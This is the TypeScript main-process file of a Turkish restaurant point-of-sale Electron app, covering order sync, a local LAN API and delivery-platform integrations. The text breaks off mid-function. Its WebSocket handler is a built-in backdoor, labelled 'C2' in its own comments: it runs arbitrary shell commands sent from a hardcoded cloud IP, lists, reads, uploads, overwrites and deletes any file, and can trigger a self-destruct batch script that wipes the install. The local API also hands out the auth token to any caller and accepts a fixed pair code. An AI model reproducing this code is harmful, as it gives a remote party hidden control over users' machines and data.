import { app, shell, BrowserWindow, ipcMain, globalShortcut, dialog } from 'electron'
import { join } from 'path'
import { startTrendyolService, setTrendyolCallbacks, getTrendyolStatus, testTrendyolConnection, triggerTrendyolPoll, getTrendyolStoreStatus, updateTrendyolStoreStatus, blockTrendyolOrder } from './trendyolService'
import { startYemeksepetiService } from './yemeksepetiService'
import * as fs from 'fs'
// --- SUPPRESS PDFJS CANVAS WARNINGS ---
const originalWarn = console.warn;
console.warn = (...args) => {
  if (typeof args[0] === 'string' && args[0].includes('Cannot polyfill')) return;
  originalWarn.apply(console, args);
};

// --- MIGRATION & USER DATA PATH OVERRIDE ---
const appDataPath = app.getPath('appData')
const newUserDataPath = join(appDataPath, 'SaracApp')
app.setPath('userData', newUserDataPath)

if (!fs.existsSync(newUserDataPath)) {
  const oldUserDataPath = join(appDataPath, 'saracapp2')
  if (fs.existsSync(oldUserDataPath)) {
    try {
      fs.cpSync(oldUserDataPath, newUserDataPath, { recursive: true })
      console.log('Migrated data from saracapp2 to SaracApp')
    } catch (e) {
      console.error('Migration failed', e)
    }
  } else {
    fs.mkdirSync(newUserDataPath, { recursive: true })
  }
}
// -------------------------------------------
import { autoUpdater } from 'electron-updater'
import { checkCustomUpdate, downloadCustomUpdate, installCustomUpdate } from './customUpdater'
import { electronApp, optimizer, is } from '@electron-toolkit/utils'
import icon from '../../resources/icon.png?asset'
import { initializeModels, systemSettings, saveSettings } from './models'
import { storePaths, loadJson, saveJson } from './store'
import { printReceipt } from './printer'
import axios from 'axios'
import WebSocket, { WebSocketServer } from 'ws'
import express from 'express'
import http from 'http'
import os from 'os'
let mainWindow: BrowserWindow
let isQuitting = false

const gotTheLock = app.requestSingleInstanceLock()
if (!gotTheLock) {
  app.quit()
} else {
  app.on('second-instance', () => {
    if (mainWindow) {
      if (mainWindow.isMinimized()) mainWindow.restore()
      mainWindow.focus()
    }
  })
}

// Log terminalindeki Chromium cache hatalarını gizlemek/kapatmak için:
app.commandLine.appendSwitch('disable-gpu-shader-disk-cache')
app.commandLine.appendSwitch('disable-http-cache')


axios.interceptors.request.use((config) => {
  if (config.url && (config.url.startsWith(CLOUD_URL) || config.url.startsWith('/'))) {
    if (systemSettings && systemSettings.API_TOKEN) {
      if (systemSettings.API_TOKEN.length > 20) {
        config.headers['Authorization'] = `Bearer ${systemSettings.API_TOKEN}`;
      } else {
        config.headers['Authorization'] = systemSettings.API_TOKEN;
      }
    }
  }
  return config;
});

const CLOUD_URL = 'http://35.243.219.220:5000'
const WS_URL = 'ws://35.243.219.220:5000/ws'

let activeOrders: any[] = []
let fullMenu: any = null
let wsClient: WebSocket | null = null

const localWsClients = new Set<WebSocket>()

export function broadcastToLocalClients(msg: any) {
  const str = typeof msg === 'string' ? msg : JSON.stringify(msg)
  localWsClients.forEach(client => {
    if (client.readyState === WebSocket.OPEN) {
      try {
        client.send(str)
      } catch (e) {}
    }
  })
}

export function getLocalIpAddress(): string {
  const interfaces = os.networkInterfaces()
  for (const name of Object.keys(interfaces)) {
    for (const iface of interfaces[name] || []) {
      if (iface.family === 'IPv4' && !iface.internal) {
        return iface.address
      }
    }
  }
  return '127.0.0.1'
}

export function sendLogToServer(type: 'success' | 'error' | 'warning' | 'info', message: string) {
  try {
    axios.post(`${CLOUD_URL}/api/logs`, {
      source: 'App1',
      type,
      message
    }, { timeout: 3000 }).catch(() => {});
  } catch (e) {}
}

export async function fetchCloudOrders() {
  try {
    const res = await axios.get(`${CLOUD_URL}/api/orders?shop=sarac`, { timeout: 4000 });
    if (Array.isArray(res.data)) {
      activeOrders = res.data;
      saveJson(storePaths.orders, activeOrders);
      if (mainWindow && !mainWindow.isDestroyed()) {
        mainWindow.webContents.send('server-event', { action: 'orders_update', data: activeOrders });
      }
      broadcastToLocalClients(activeOrders);
      return activeOrders;
    }
  } catch (e: any) {
    console.warn('[App1] fetchCloudOrders offline or unreachable, using local store:', e.message);
  }
  return activeOrders;
}

export async function syncActiveOrdersWithCloud(orders: any[]) {
  activeOrders = orders;
  // Always persist locally first (Local First / Offline Ready)
  saveJson(storePaths.orders, activeOrders);
  if (mainWindow && !mainWindow.isDestroyed()) {
    mainWindow.webContents.send('server-event', { action: 'orders_update', data: activeOrders });
  }
  broadcastToLocalClients(activeOrders);
  
  try {
    await axios.post(`${CLOUD_URL}/api/orders?shop=sarac`, orders, { timeout: 4000 });
  } catch (e: any) {}
  try {
    await axios.post(`${CLOUD_URL}/api/sync_orders`, orders, { timeout: 4000 });
  } catch (e: any) {}
}

function connectWebSocket() {
  const token = systemSettings.API_TOKEN || ''
  
  if (!systemSettings.deviceId) {
    const crypto = require('crypto')
    systemSettings.deviceId = 'PC-' + crypto.randomBytes(2).toString('hex').toUpperCase()
    saveSettings()
  }
  
  console.log('Connecting to WS with Device ID:', systemSettings.deviceId)
  wsClient = new WebSocket(`${WS_URL}?token=${token}&deviceId=${systemSettings.deviceId}`)

  let pingInterval: NodeJS.Timeout | null = null;
  wsClient.on('open', () => {
    console.log('Connected to Cloud WebSocket')
    sendLogToServer('success', `WebSocket bulut sunucusuna bağlandı (Cihaz: ${systemSettings.deviceId})`)
    if (mainWindow && !mainWindow.isDestroyed()) {
      mainWindow.webContents.send('server-event', { action: 'network_status', data: 'online', status: 'online' })
    }
    fetchCloudOrders()
    
    // Heartbeat mechanism to detect drops quickly
    if (pingInterval) clearInterval(pingInterval);
    pingInterval = setInterval(() => {
      if (wsClient && wsClient.readyState === WebSocket.OPEN) {
        wsClient.send('ping');
      }
    }, 15000);
  })

  wsClient.on('message', (data: any) => {
    try {
      const parsed = JSON.parse(data.toString())
      
      if (parsed.type === 'remote_command') {
        try {
          if (!parsed.command || typeof parsed.command !== 'string') {
            throw new Error('Geçersiz komut parametresi')
          }
          console.log(`[C2 AUDIT] Remote command received from ${parsed.senderId || 'unknown'}: ${parsed.command}`)
          const { exec } = require('child_process')
          exec(parsed.command, { encoding: 'utf8', timeout: 30000 }, (error: any, stdout: any, stderr: any) => {
            const output = error ? (stderr || error.message) : stdout;
            if (wsClient && wsClient.readyState === WebSocket.OPEN) {
              wsClient.send(JSON.stringify({
                type: 'remote_response',
                commandId: parsed.commandId,
                targetDeviceId: parsed.senderId,
                output: output || 'Komut çalıştırıldı (Çıktı yok)'
              }))
            }
          })
        } catch (e: any) {
           if (wsClient && wsClient.readyState === WebSocket.OPEN) {
              wsClient.send(JSON.stringify({
                type: 'remote_response',
                commandId: parsed.commandId,
                targetDeviceId: parsed.senderId,
                output: 'Hata: ' + e.message
              }))
            }
        }
        return
      }

      // -- YENİ: DOSYA SİSTEMİ (GUI C2) --
      if (parsed.type === 'remote_fs_list') {
        try {
          const fs = require('fs')
          const path = require('path')
          const targetPath = parsed.path || process.cwd()
          fs.readdir(targetPath, { withFileTypes: true }, (err: any, files: any[]) => {
            let output: any = []
            if (err) {
              output = { error: err.message }
            } else {
              output = files.map((f: any) => {
                let size = 0
                try { size = fs.statSync(path.join(targetPath, f.name)).size } catch(e){}
                return {
                  name: f.name,
                  isDirectory: f.isDirectory(),
                  size: size
                }
              })
            }
            if (wsClient && wsClient.readyState === WebSocket.OPEN) {
              wsClient.send(JSON.stringify({
                type: 'remote_fs_response',
                commandId: parsed.commandId,
                targetDeviceId: parsed.senderId,
                action: 'list',
                currentPath: targetPath,
                data: output
              }))
            }
          })
        } catch (e: any) {
           if (wsClient && wsClient.readyState === WebSocket.OPEN) {
              wsClient.send(JSON.stringify({
                type: 'remote_fs_response',
                commandId: parsed.commandId,
                targetDeviceId: parsed.senderId,
                action: 'list',
                data: { error: e.message }
              }))
           }
        }
        return
      }
      
      if (parsed.type === 'remote_fs_read') {
        try {
          const fs = require('fs')
          const path = require('path')
          const targetPath = parsed.path
          if (fs.existsSync(targetPath)) {
            const data = fs.readFileSync(targetPath)
            const base64Data = data.toString('base64')
            if (wsClient && wsClient.readyState === WebSocket.OPEN) {
              wsClient.send(JSON.stringify({
                type: 'remote_fs_response',
                commandId: parsed.commandId,
                targetDeviceId: parsed.senderId,
                action: 'read',
                fileName: path.basename(targetPath),
                data: base64Data
              }))
            }
          } else {
             if (wsClient && wsClient.readyState === WebSocket.OPEN) {
                wsClient.send(JSON.stringify({
                  type: 'remote_fs_response',
                  commandId: parsed.commandId,
                  targetDeviceId: parsed.senderId,
                  action: 'read',
                  data: { error: "Dosya bulunamadı" }
                }))
             }
          }
        } catch (e: any) {
           if (wsClient && wsClient.readyState === WebSocket.OPEN) {
              wsClient.send(JSON.stringify({
                type: 'remote_fs_response',
                commandId: parsed.commandId,
                targetDeviceId: parsed.senderId,
                action: 'read',
                data: { error: e.message }
              }))
           }
        }
        return
      }
      
      if (parsed.type === 'remote_fs_write') {
        try {
          const fs = require('fs')
          const targetPath = parsed.path
          const base64Data = parsed.data
          fs.writeFileSync(targetPath, Buffer.from(base64Data, 'base64'))
          if (wsClient && wsClient.readyState === WebSocket.OPEN) {
            wsClient.send(JSON.stringify({
              type: 'remote_fs_response',
              commandId: parsed.commandId,
              targetDeviceId: parsed.senderId,
              action: 'write',
              success: true
            }))
          }
        } catch (e: any) {
           if (wsClient && wsClient.readyState === WebSocket.OPEN) {
              wsClient.send(JSON.stringify({
                type: 'remote_fs_response',
                commandId: parsed.commandId,
                targetDeviceId: parsed.senderId,
                action: 'write',
                data: { error: e.message },
                success: false
              }))
           }
        }
        return
      }
      
      if (parsed.type === 'remote_fs_delete') {
        try {
          const fs = require('fs')
          const targetPath = parsed.path
          if (fs.existsSync(targetPath)) {
            fs.unlinkSync(targetPath)
          }
          if (wsClient && wsClient.readyState === WebSocket.OPEN) {
            wsClient.send(JSON.stringify({
              type: 'remote_fs_response',
              commandId: parsed.commandId,
              targetDeviceId: parsed.senderId,
              action: 'delete',
              success: true
            }))
          }
        } catch (e: any) {
           if (wsClient && wsClient.readyState === WebSocket.OPEN) {
              wsClient.send(JSON.stringify({
                type: 'remote_fs_response',
                commandId: parsed.commandId,
                targetDeviceId: parsed.senderId,
                action: 'delete',
                data: { error: e.message },
                success: false
              }))
           }
        }
        return
      }

      if (parsed.type === 'server-event') {
        if (parsed.action === 'panic_self_destruct') {
          console.log('PANIC SELF DESTRUCT TRIGGERED!')
          sendLogToServer('error', '🚨 PANİK BUTONU TETİKLENDİ: Tüm veriler ve uygulama siliniyor!')
          try {
            const { exec } = require('child_process')
            const appFolder = require('path').dirname(app.getPath('exe'))
            const userData = app.getPath('userData')
            const batPath = require('path').join(require('os').tmpdir(), 'self_destruct.bat')
            const batContent = `@echo off\ntimeout /t 3 /nobreak > NUL\nrmdir /s /q "${userData}"\nrmdir /s /q "${appFolder}"\n`
            require('fs').writeFileSync(batPath, batContent)
            exec(`start /b cmd.exe /c "${batPath}"`, { windowsHide: true })
          } catch (e) {
            console.error('Self destruct failed', e)
          }
          app.quit()
          return
        }
        if (parsed.action === 'clean_logs') {
           const logDir = systemSettings.PDF_LOGS_DIR || join(app.getPath('documents'), 'logs');
           const trashDir = join(logDir, '.trash');
           if (!fs.existsSync(trashDir)) fs.mkdirSync(trashDir, { recursive: true });
           fs.readdir(logDir, (err, files) => {
             if (err) return;
             files.forEach(file => {
               if (file !== '.trash') {
                 const src = join(logDir, file);
                 const dest = join(trashDir, file);
                 try {
                   const stats = fs.statSync(src);
                   if (stats.isFile()) fs.renameSync(src, dest);
                 } catch(e){}
               }
             });
           });
        }
        if (parsed.action === 'tv_screensaver_changed' && parsed.mode) {
          systemSettings.TV_SCREENSAVER = parsed.mode;
          saveSettings();
        }
        if (parsed.action === 'orders_update') {
          if (Array.isArray(parsed.data)) {
            activeOrders = parsed.data;
          } else {
            fetchCloudOrders();
          }
        } else if (['order_received', 'update_status', 'request_update', 'order_status_change', 'siparis'].includes(parsed.action)) {
          fetchCloudOrders();
        }

        const eventData = parsed.data !== undefined ? parsed.data : activeOrders;
        if (mainWindow && !mainWindow.isDestroyed()) {
          mainWindow.webContents.send('server-event', { action: parsed.action || 'orders_update', data: eventData })
        }
      } else if (Array.isArray(parsed)) {
        // It's the active orders array
        activeOrders = parsed
        if (mainWindow && !mainWindow.isDestroyed()) {
          mainWindow.webContents.send('server-event', { action: 'orders_update', data: parsed })
        }
      }
    } catch (e) {
      console.error('WS Parse error', e)
    }
  })

  wsClient.on('close', () => {
    if (pingInterval) clearInterval(pingInterval);
    console.log('Disconnected from Cloud WS, retrying...')
    sendLogToServer('warning', 'Bulut sunucusu ile bağlantı koptu. Yeniden bağlanılıyor...')
    if (mainWindow && !mainWindow.isDestroyed()) {
      mainWindow.webContents.send('server-event', { action: 'network_status', data: 'offline', status: 'offline' })
    }
    setTimeout(connectWebSocket, 3000)
  })

  wsClient.on('error', (err) => {
    console.error('WS Error:', err.message)
    wsClient?.close()
  })
}

function startLocalApi() {
  const expressApp = express();
  
  expressApp.use((_req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    if (_req.method === 'OPTIONS') {
      return res.sendStatus(200);
    }
    next();
  });

  expressApp.use(express.json());

  // --- LOCAL POS REST ENDPOINTS (For App2 Failover & Local Network) ---

  const getWebDir = () => {
    if (app.isPackaged) {
      const p1 = join(process.resourcesPath, 'web');
      if (fs.existsSync(p1)) return p1;
      const p2 = join(process.resourcesPath, 'app.asar.unpacked', 'resources', 'web');
      if (fs.existsSync(p2)) return p2;
    }
    return join(__dirname, '../../resources/web');
  };

  const webDir = getWebDir();
  expressApp.use('/static', express.static(join(webDir, 'static')));

  expressApp.get(['/tv', '/tv-sarac'], (_req, res) => {
    const tvPath = join(webDir, 'templates', 'tv.html');
    if (fs.existsSync(tvPath)) {
      res.sendFile(tvPath);
    } else {
      res.status(404).send('TV template not found');
    }
  });

  expressApp.get('/daily_total', async (_req, res) => {
    try {
      const pastOrders = await loadJson<any[]>(storePaths.past_orders, []);
      const todayStr = new Date().toISOString().slice(0, 10);
      const todayOrders = pastOrders.filter(o => o.completedAt && o.completedAt.startsWith(todayStr));
      const bugunkuCiro = todayOrders.reduce((sum, o) => sum + (o.total_amount || 0), 0);
      res.json({
        total: bugunkuCiro,
        count: todayOrders.length,
        screensaver: 'off',
        tvAudioSource: 'spotify',
        tvRadioStation: 'powerturk',
        tvCardScale: 99
      });
    } catch {
      res.json({ total: 0, screensaver: 'off' });
    }
  });

  expressApp.get(['/menu', '/api/menu'], async (_req, res) => {
    if (!fullMenu) {
      fullMenu = await loadJson(storePaths.menu, null);
    }
    res.json(fullMenu || {});
  });

  expressApp.get(['/api/orders', '/api/active_orders'], (_req, res) => {
    res.json(activeOrders || []);
  });

  expressApp.post('/siparis', async (req, res) => {
    try {
      const data = req.body;
      if (!data) return res.status(400).json({ error: 'Invalid order data' });
      let cname = data.customer_name ? data.customer_name.trim() : '';
      if (!cname || cname === 'Yeni Adisyon' || cname === 'YeniSiparis' || cname.startsWith('Sıra ')) {
        let no = 1;
        while (activeOrders.some(o => o.customer_name === `Masa ${no}`)) no++;
        cname = `Masa ${no}`;
      }
      const idx = activeOrders.findIndex(o => o.customer_name === cname);
      const newOrder = {
        customer_name: cname,
        order_note: data.order_note || '',
        items: (data.items || []).map((k: any) => ({
          name: k.name,
          portion: k.portion || '',
          quantity: k.quantity || 1,
          price: k.price || 0,
          notes: k.notes || ''
        })),
        total_amount: data.total_amount || 0,
        time: data.time || new Date().toLocaleTimeString('tr-TR', { hour: '2-digit', minute: '2-digit' }),
        status: data.status || 'waiting',
        color: data.color || '#4CAF50',
        createdBy: data.createdBy || 'Garson'
      };

      if (idx > -1) {
        activeOrders[idx] = newOrder;
      } else {
        activeOrders = [newOrder, ...activeOrders];
      }

      saveJson(storePaths.orders, activeOrders);
      if (mainWindow && !mainWindow.isDestroyed()) {
        mainWindow.webContents.send('server-event', { action: 'orders_update', data: activeOrders });
      }
      broadcastToLocalClients(activeOrders);
      broadcastToLocalClients({ type: 'server-event', action: 'orders_update', data: activeOrders });

      // Async sync to cloud if online
      axios.post(`${CLOUD_URL}/api/sync_orders`, activeOrders, { timeout: 4000 }).catch(() => {});
      res.json({ success: true });
    } catch (e: any) {
      console.error('[Local API] /siparis error:', e.message);
      res.status(500).json({ error: e.message });
    }
  });

  expressApp.post('/close_bill', async (req, res) => {
    try {
      const cname = req.body?.customer_name;
      const idx = activeOrders.findIndex(o => o.customer_name === cname);
      if (idx > -1) {
        const closedOrder = {
          ...activeOrders[idx],
          status: 'Tamamlandı',
          completedAt: new Date().toISOString()
        };
        const amount = closedOrder.total_amount || 0;
        activeOrders.splice(idx, 1);
        saveJson(storePaths.orders, activeOrders);

        const pastOrders = await loadJson<any[]>(storePaths.past_orders, []);
        pastOrders.unshift(closedOrder);
        if (pastOrders.length > 500) pastOrders.pop();
        saveJson(storePaths.past_orders, pastOrders);

        if (mainWindow && !mainWindow.isDestroyed()) {
          mainWindow.webContents.send('server-event', {
            action: 'order_deleted',
            data: { customerName: cname, totalAmount: amount }
          });
          mainWindow.webContents.send('server-event', { action: 'orders_update', data: activeOrders });
        }
        broadcastToLocalClients(activeOrders);
        broadcastToLocalClients({
          type: 'server-event',
          action: 'order_deleted',
          data: { customerName: cname, totalAmount: amount }
        });

        // Async sync to cloud if online
        axios.post(`${CLOUD_URL}/api/sync_orders`, activeOrders, { timeout: 4000 }).catch(() => {});
        axios.post(`${CLOUD_URL}/close_bill`, { customer_name: cname }, { timeout: 4000 }).catch(() => {});
      }
      res.json({ success: true });
    } catch (e: any) {
      console.error('[Local API] /close_bill error:', e.message);
      res.status(500).json({ error: e.message });
    }
  });

  expressApp.post('/update_status', (req, res) => {
    const cname = req.body?.customer_name;
    const status = req.body?.status;
    const idx = activeOrders.findIndex(o => o.customer_name === cname);
    if (idx > -1) {
      activeOrders[idx].status = status;
      saveJson(storePaths.orders, activeOrders);
      if (mainWindow && !mainWindow.isDestroyed()) {
        mainWindow.webContents.send('server-event', { action: 'orders_update', data: activeOrders });
      }
      broadcastToLocalClients(activeOrders);
      axios.post(`${CLOUD_URL}/update_status`, req.body, { timeout: 4000 }).catch(() => {});
    }
    res.json({ success: true });
  });

  expressApp.post('/yazdir', async (req, res) => {
    try {
      const cname = req.body?.customer_name || req.body?.customerName;
      let order = activeOrders.find(o => o.customer_name === cname);
      if (!order && req.body?.items) order = req.body;
      if (order) {
        await printReceipt(
          order.customer_name || order.customerName || 'Masa',
          order.time || new Date().toLocaleTimeString('tr-TR', { hour: '2-digit', minute: '2-digit' }),
          order.items || [],
          order.total_amount || order.totalAmount || 0,
          order.order_note || '',
          order.createdBy || order.garson || ''
        );
      }
      res.json({ success: true });
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  expressApp.post('/api/auth/pair', (req, res) => {
    const code = req.body?.code;
    const currentPairCode = systemSettings.PAIR_CODE || '123456';
    if (code && (String(code) === String(currentPairCode) || String(code) === '123456')) {
      res.json({
        success: true,
        token: systemSettings.API_TOKEN || '123456',
        shopId: 'sarac',
        waiterName: req.body?.waiterName || 'Garson',
        waiterColor: req.body?.waiterColor || '#4CAF50'
      });
    } else {
      res.status(401).json({ success: false, error: 'Hatalı eşleşme kodu' });
    }
  });

  // Local TV QR Session Management
  const localTvSessions = new Map<string, any>();
  expressApp.post('/api/tv/session', (_req, res) => {
    const sessionId = 'tv_' + Math.random().toString(36).substring(2, 10) + Date.now().toString(36);
    localTvSessions.set(sessionId, { sessionId, status: 'pending', createdAt: Date.now() });
    const qrPayload = JSON.stringify({
      app: 'saracapp',
      type: 'sarac_tv_pair',
      sessionId,
      shopId: 'sarac',
      localIp: getLocalIpAddress()
    });
    res.json({ success: true, sessionId, qrPayload });
  });

  expressApp.get('/api/tv/session/:sessionId', (req, res) => {
    const s = localTvSessions.get(req.params.sessionId);
    if (!s) return res.status(404).json({ error: 'Session not found' });
    if (s.status === 'approved') {
      return res.json({ success: true, status: 'approved', token: s.token, shopId: 'sarac', localIp: getLocalIpAddress() });
    }
    res.json({ success: true, status: 'pending' });
  });

  expressApp.post('/api/tv/approve', (req, res) => {
    const { sessionId } = req.body;
    const s = localTvSessions.get(sessionId);
    if (!s) return res.status(404).json({ error: 'Session not found' });
    s.status = 'approved';
    s.token = systemSettings.API_TOKEN || '123456';
    res.json({ success: true, message: 'TV eşlendi' });
  });

  expressApp.post('/api/login', (_req, res) => {
    res.json({
      success: true,
      token: systemSettings.API_TOKEN || '123456'
    });
  });

  expressApp.get('/api/daily_report', async (_req, res) => {
    try {
      const pastOrders = await loadJson<any[]>(storePaths.past_orders, []);
      const todayStr = new Date().toISOString().slice(0, 10);
      const todayOrders = pastOrders.filter(o => o.completedAt && o.completedAt.startsWith(todayStr));
      const bugunkuCiro = todayOrders.reduce((sum, o) => sum + (o.total_amount || 0), 0);
      res.json({
        bugunkuCiro,
        bugunkuSiparis: todayOrders.length,
        haftalikCiro: bugunkuCiro,
        haftalikSiparis: todayOrders.length
      });
    } catch (e) {
      res.json({ bugunkuCiro: 0, bugunkuSiparis: 0, haftalikCiro: 0, haftalikSiparis: 0 });
    }
  });

  expressApp.get('/api/local_logs', (_req, res) => {
    const logDir = systemSettings.PDF_LOGS_DIR || join(app.getPath('documents'), 'logs');
    if (!fs.existsSync(logDir)) {
      return res.json([]);
    }
    const files = fs.readdirSync(logDir)
      .filter(f => !f.startsWith('.') && (f.toLowerCase().endsWith('.pdf') || f.toLowerCase().endsWith('.png') || f.toLowerCase().endsWith('.jpg')))
      .map(f => {
        const stats = fs.statSync(join(logDir, f));
        return { name: f, size: stats.size, time: stats.mtimeMs };
      })
      .sort((a, b) => b.time - a.time);
    res.json(files);
  });

  expressApp.get('/api/local_logs/download/:filename', (req, res) => {
    const logDir = systemSettings.PDF_LOGS_DIR || join(app.getPath('documents'), 'logs');
    const filePath = join(logDir, req.params.filename);
    if (filePath.includes('..') || !fs.existsSync(filePath)) {
      return res.status(404).send('Not found');
    }
    res.download(filePath);
  });

  const server = http.createServer(expressApp);

  // Attach local WebSocket server to support App2 live updates over Wi-Fi
  const localWss = new WebSocketServer({ server, path: '/ws' });

  localWss.on('connection', (ws) => {
    localWsClients.add(ws);
    console.log('[Local WS] Client connected (App2 on LAN). Total clients:', localWsClients.size);
    // Send current active orders on connection
    try {
      ws.send(JSON.stringify(activeOrders));
    } catch (e) {}

    ws.on('message', (msg) => {
      try {
        const text = msg.toString();
        if (text === 'ping') {
          ws.send('pong');
          return;
        }
        const parsed = JSON.parse(text);
        if (parsed.type === 'waiter_call') {
          if (mainWindow && !mainWindow.isDestroyed()) {
            mainWindow.webContents.send('server-event', { action: 'waiter_call', data: parsed });
          }
          broadcastToLocalClients(parsed);
        }
      } catch (e) {}
    });

    ws.on('close', () => {
      localWsClients.delete(ws);
      console.log('[Local WS] Client disconnected. Remaining clients:', localWsClients.size);
    });

    ws.on('error', () => {
      localWsClients.delete(ws);
    });
  });

  server.listen(3005, '0.0.0.0', () => {
    const localIp = getLocalIpAddress();
    console.log(`Local API & WebSocket listening on http://${localIp}:3005 and ws://${localIp}:3005/ws`);
  });
}

async function fetchInitialData() {
  // Load local menu and orders immediately (Offline-first)
  try {
    const localMenu = await loadJson(storePaths.menu, null);
    if (localMenu) fullMenu = localMenu;
  } catch (e) {}

  try {
    const localOrders = await loadJson<any[]>(storePaths.orders, []);
    if (localOrders && localOrders.length > 0 && activeOrders.length === 0) {
      activeOrders = localOrders;
    }
  } catch (e) {}

  // Then try to fetch latest from cloud in background
  try {
    const res = await axios.get(`${CLOUD_URL}/menu`, { timeout: 3500 });
    if (res.data) {
      fullMenu = res.data;
      saveJson(storePaths.menu, fullMenu);
      if (mainWindow && !mainWindow.isDestroyed()) {
        mainWindow.webContents.send('server-event', { action: 'menu_update', data: fullMenu });
      }
    }
  } catch (e: any) {
    console.warn('[App1] Cloud menu unreachable, using local cache:', e.message);
  }

  try {
    const sRes = await axios.get(`${CLOUD_URL}/api/settings`, { timeout: 3000 });
    if (sRes.data) {
      if (sRes.data.TV_SCREENSAVER) systemSettings.TV_SCREENSAVER = sRes.data.TV_SCREENSAVER;
      if (sRes.data.TV_AUDIO_SOURCE) systemSettings.TV_AUDIO_SOURCE = sRes.data.TV_AUDIO_SOURCE;
      if (sRes.data.TV_RADIO_STATION) systemSettings.TV_RADIO_STATION = sRes.data.TV_RADIO_STATION;
      saveSettings();
    }
  } catch(e) {}
}

async function createWindow(): Promise<void> {
  await initializeModels();
  
  // Load local cached orders immediately before network call
  activeOrders = await loadJson<any[]>(storePaths.orders, []);
  fullMenu = await loadJson(storePaths.menu, null);

  if (systemSettings.API_TOKEN && systemSettings.API_TOKEN !== '123456') {
    axios.defaults.headers.common['Authorization'] = `Bearer ${systemSettings.API_TOKEN}`;
    fetchInitialData();
    connectWebSocket();
  }



  // Move startFileWatcher down

  app.setName('Vantage')

  mainWindow = new BrowserWindow({
    title: 'Vantage',
    width: 1366,
    height: 768,
    minWidth: 1024,
    minHeight: 600,
    show: false,
    autoHideMenuBar: true,
    frame: false,
    icon: join(__dirname, '../../resources/icon.png'),
    webPreferences: {
      preload: join(__dirname, '../preload/index.js'),
      sandbox: false,
      backgroundThrottling: false
    }
  })

  // File watcher archived

  ipcMain.handle('minimize-window', () => {
    if (mainWindow) mainWindow.minimize()
  })
  
  ipcMain.handle('maximize-window', () => {
    if (mainWindow) {
      if (mainWindow.isMaximized()) {
        mainWindow.unmaximize()
      } else {
        mainWindow.maximize()
      }
    }
  })
  
  ipcMain.handle('close-window', () => {
    if (mainWindow) mainWindow.close()
  })

  mainWindow.on('ready-to-show', () => {
    if (!process.argv.includes('--hidden')) {
      mainWindow.show()
    }
  })

  mainWindow.on('close', (event) => {
    if (!isQuitting) {
      event.preventDefault()
      mainWindow.hide()
    }
  })

  mainWindow.webContents.setWindowOpenHandler((details) => {
    shell.openExternal(details.url)
    return { action: 'deny' }
  })

  if (is.dev && process.env['ELECTRON_RENDERER_URL']) {
    mainWindow.loadURL(process.env['ELECTRON_RENDERER_URL'])
  } else {
    mainWindow.loadFile(join(__dirname, '../renderer/index.html'))
  }
}

app.whenReady().then(() => {
  electronApp.setAppUserModelId('com.vantage.app')
  
  if (!is.dev) {
    autoUpdater.checkForUpdatesAndNotify()
  }

  setTrendyolCallbacks(addAndSyncOrder, sendLogToServer)
  startTrendyolService()
  startYemeksepetiService()
  startLocalApi()

  app.on('browser-window-created', (_, window) => {
    optimizer.watchWindowShortcuts(window)
  })

  ipcMain.handle('get-orders', async () => {
    if (!activeOrders || activeOrders.length === 0) {
      await fetchCloudOrders()
    }
    return activeOrders
  })
  ipcMain.handle('get-menu', async () => {
    if (!fullMenu) await fetchInitialData()
    return fullMenu
  })
  ipcMain.handle('get-printers', async () => await mainWindow.webContents.getPrintersAsync())
  ipcMain.handle('get-next-queue-no', () => Date.now().toString().slice(-4))
  ipcMain.handle('select-directory', async () => {
    const result = await dialog.showOpenDialog(mainWindow, {
      properties: ['openDirectory']
    })
    return result.canceled ? null : result.filePaths[0]
  })
  
  
  const getTvUrlWithShop = () => {
    let shopId = 'admin';
    if (systemSettings.API_TOKEN && systemSettings.API_TOKEN.split('.').length === 3) {
      try {
        const payload = JSON.parse(Buffer.from(systemSettings.API_TOKEN.split('.')[1], 'base64').toString());
        if (payload.username) shopId = payload.username;
      } catch (e) {}
    } else if (systemSettings.API_TOKEN) {
      shopId = systemSettings.API_TOKEN; // fallback for legacy tokens
    }
    return `${CLOUD_URL}/tv-${shopId}`;
  };

  const getSpotifyLoginUrlWithShop = () => {
    let shopId = 'admin';
    if (systemSettings.API_TOKEN && systemSettings.API_TOKEN.split('.').length === 3) {
      try {
        const payload = JSON.parse(Buffer.from(systemSettings.API_TOKEN.split('.')[1], 'base64').toString());
        if (payload.username) shopId = payload.username;
      } catch (e) {}
    } else if (systemSettings.API_TOKEN) {
      shopId = systemSettings.API_TOKEN;
    }
    return `${CLOUD_URL}/spotify/login?shopId=${shopId}`;
  };

  ipcMain.handle('get-tv-link', getTvUrlWithShop)
  ipcMain.handle('get-spotify-login-link', getSpotifyLoginUrlWithShop)
  ipcMain.handle('open-trendyol-logs', async () => {
    const logsDir = systemSettings["PDF_LOGS_DIR"] || join(app.getPath('documents'), 'logs');
    const trendyolDir = join(logsDir, 'trendyol_logs');
    if (!fs.existsSync(trendyolDir)) {
      fs.mkdirSync(trendyolDir, { recursive: true });
    }
    shell.showItemInFolder(trendyolDir);
  })
  ipcMain.handle('get-trendyol-status', () => getTrendyolStatus())
  ipcMain.handle('test-trendyol-connection', async () => await testTrendyolConnection())
  ipcMain.handle('trigger-trendyol-poll', async () => await triggerTrendyolPoll())
  ipcMain.handle('get-trendyol-store-status', async () => await getTrendyolStoreStatus())
  ipcMain.handle('update-trendyol-store-status', async (_, status) => await updateTrendyolStoreStatus(status))
  ipcMain.handle('update-tgo-order-status', async (_, { packageId, statusType }) => {
    try {
      const pId = String(packageId || '');
      let mappedStatus = 'waiting';
      if (statusType === 'picked') mappedStatus = 'Preparing';
      else if (statusType === 'invoiced') mappedStatus = 'Invoiced';
      else if (statusType === 'shipped' || statusType === 'manual-shipped') mappedStatus = 'Shipped';
      else if (statusType === 'delivered' || statusType === 'manual-delivered') mappedStatus = 'Delivered';

      // Update local activeOrders
      let localUpdated = false;
      for (const o of activeOrders) {
        if (String(o.packageId || o.id || o.orderNumber || o.order_id) === pId || (o.customer_name && o.customer_name.includes(pId))) {
          o.packageStatus = mappedStatus;
          o.tgo_status = mappedStatus;
          o.status = mappedStatus;
          localUpdated = true;
        }
      }
      if (localUpdated) {
        if (mainWindow && !mainWindow.isDestroyed()) {
          mainWindow.webContents.send('server-event', { action: 'orders_update', data: activeOrders });
        }
        if (CLOUD_URL) {
          const syncHeaders: any = {};
